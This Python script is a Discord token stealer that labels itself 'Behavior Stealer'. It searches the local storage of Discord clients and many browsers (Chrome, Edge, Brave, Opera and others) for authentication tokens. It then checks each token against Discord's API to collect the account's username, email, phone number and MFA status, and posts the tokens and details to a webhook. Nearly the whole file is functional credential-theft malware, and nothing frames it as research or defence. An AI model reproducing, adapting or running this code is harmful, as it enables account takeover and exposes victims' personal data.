import os
import re
import requests

AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png?ex=684d7494&is=684c2314&hm=cc402308b49849ba4db04ecad335ecb7bdd8e566ef1916b0a8396a37d4bfdb3b&"


def get_discord_tokens():
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    tokens = []

    discord_folders = [
        "Discord", "discordcanary", "discordptb", "DiscordDevelopment", "Lightcord"
    ]

    browser_folders = {
        "Chrome": "Google\\Chrome\\User Data\\Default",
        "Edge": "Microsoft\\Edge\\User Data\\Default",
        "Brave": "BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Opera": "Opera Software\\Opera Stable",
        "Vivaldi": "Vivaldi\\User Data\\Default",
        "Yandex": "Yandex\\YandexBrowser\\User Data\\Default",
        "Chromium": "Chromium\\User Data\\Default",
        "Torch": "Torch\\User Data\\Default",
        "Comodo": "Comodo\\Dragon\\User Data\\Default",
        "360Browser": "360Browser\\Browser\\User Data\\Default",
        "Epic": "Epic Privacy Browser\\User Data\\Default"
    }

    appdata_roaming = os.getenv("APPDATA")
    appdata_local = os.getenv("LOCALAPPDATA")

    def scan_leveldb_for_tokens(path):
        found = []
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    with open(os.path.join(path, file), errors="ignore") as f:
                        for line in f:
                            found += re.findall(token_regex, line)
        except Exception as e:
            print(f"[-] Could not scan folder {path}: {e}")
        return found

    total_tokens = 0

    for folder in discord_folders:
        leveldb = os.path.join(appdata_roaming, folder, "Local Storage", "leveldb")
        if os.path.exists(leveldb):
            print(f"[+] Scanning folder: {leveldb}")
            found = scan_leveldb_for_tokens(leveldb)
            print(f"[+] Tokens found in {leveldb}: {len(found)}")
            tokens.extend(found)
        else:
            print(f"[-] Folder not found: {leveldb}")

    for browser, path in browser_folders.items():
        leveldb = os.path.join(appdata_local, path, "Local Storage", "leveldb")
        if os.path.exists(leveldb):
            print(f"[+] Scanning folder: {leveldb}")
            found = scan_leveldb_for_tokens(leveldb)
            print(f"[+] Tokens found in {leveldb}: {len(found)}")
            tokens.extend(found)
        else:
            print(f"[-] Folder not found: {leveldb}")

    unique_tokens = list(set(tokens))
    print(f"[*] Total unique tokens found: {len(unique_tokens)}")

    for t in unique_tokens:
        print(f"Token found: {t} (length: {len(t)})")

    return unique_tokens

def fetch_token_info(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0"
    }
    try:
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if res.status_code == 200:
            data = res.json()
            print(f"[+] Valid token for user: {data['username']}#{data['discriminator']}")
            return {
                "username": f"{data['username']}#{data['discriminator']}",
                "id": data.get("id"),
                "email": data.get("email", "N/A"),
                "phone": data.get("phone", "N/A"),
                "verified": data.get("verified"),
                "mfa_enabled": data.get("mfa_enabled"),
                "flags": data.get("flags", 0),
                "locale": data.get("locale", "N/A"),
                "token": token
            }
        else:
            print(f"[-] Invalid token (HTTP {res.status_code}): {token[:10]}...")
    except Exception as e:
        print(f"[-] Error validating token: {e}")
    return None

def send_tokens_embed(webhook_url, valid_tokens_info):
    embeds = []
    for info in valid_tokens_info:
        embed = {
            "title": "\U0001F4A1 Valid Discord Token Found",
            "description": f"""
> \U0001F464 **User**: `{info['username']}`
> \U0001F4E7 **Email**: `{info['email']}`
> \U0001F4F1 **Phone**: `{info['phone']}`
> \U0001F510 **MFA Enabled**: `{info['mfa_enabled']}`
> \U0001F516 **Verified**: `{info['verified']}`
> \U0001F4AC **Locale**: `{info['locale']}`
> \U0001F5A5 **Flags**: `{info['flags']}`

```fix
{info['token']}
```""",
            "color": 0x7289DA,
            "footer": {"text": "Behavior Stealer \U0001F47E"}
        }
        embeds.append(embed)

    if embeds:
        payload = {
            "username": "Behavior Stealer",
            "avatar_url": AVATAR_URL,
            "embeds": embeds
        }
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print("[+] Successfully sent tokens info to webhook.")
            else:
                print(f"[-] Failed to send webhook (HTTP {response.status_code})")
        except Exception as e:
            print(f"[-] Error sending webhook: {e}")

def main():
    print("[*] Starting BehaviorBuilder script")
    raw_tokens = get_discord_tokens()
    if not raw_tokens:
        print("[-] No tokens found.")
        return

    valid_infos = []
    for token in raw_tokens:
        info = fetch_token_info(token)
        if info:
            valid_infos.append(info)

    if valid_infos:
        send_tokens_embed(Behavior, valid_infos)
    else:
        print("[-] No valid tokens found.")

if __name__ == "__main__":
    main()
